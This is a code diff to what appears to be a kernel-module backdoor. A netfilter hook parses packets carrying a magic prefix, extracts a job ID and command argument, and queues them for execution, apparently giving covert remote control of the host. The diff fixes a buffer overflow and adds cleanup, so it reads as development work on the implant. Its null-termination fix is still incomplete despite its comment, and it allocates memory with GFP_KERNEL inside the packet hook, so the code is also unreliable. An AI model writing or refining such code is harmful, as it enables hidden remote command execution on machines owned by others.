@@ -209,7 +209,7 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     user_data += CMD_MAGIC_LEN;
     user_data_len -= CMD_MAGIC_LEN;
 
-    job_id = get_unaligned((job_id_t *)(user_data));
+    job_id = get_unaligned((job_id_t *)user_data);
     user_data += sizeof(job_id_t);
     user_data_len -= sizeof(job_id_t);
 
@@ -219,8 +219,8 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     command_work = kmalloc(sizeof(struct MRK_command_work), GFP_KERNEL);
     INIT_WORK(&command_work->work, handle_command);
     command_work->cmd = cmd;
-    arg = kmalloc(user_data_len, GFP_KERNEL);
-    memcpy(arg, user_data, user_data_len + 1); /* we want the string to be null-terminated */
+    arg = kmalloc(user_data_len + 1, GFP_KERNEL); /* we want the string to be null-terminated */
+    memcpy(arg, user_data, user_data_len);
     command_work->arg = arg;
     command_work->local_addr = iph->daddr;
     command_work->remote_addr = iph->saddr;
@@ -241,4 +241,9 @@ int MRK_init_nethook(void) {
     net_hook->pf = PF_INET;
     net_hook->priority = NF_IP_PRI_FILTER;
     return nf_register_net_hook(&init_net, net_hook);
+}
+
+void MRK_exit_nethook(void) {
+    nf_unregister_net_hook(&init_net, net_hook);
+    kfree(net_hook);
 }
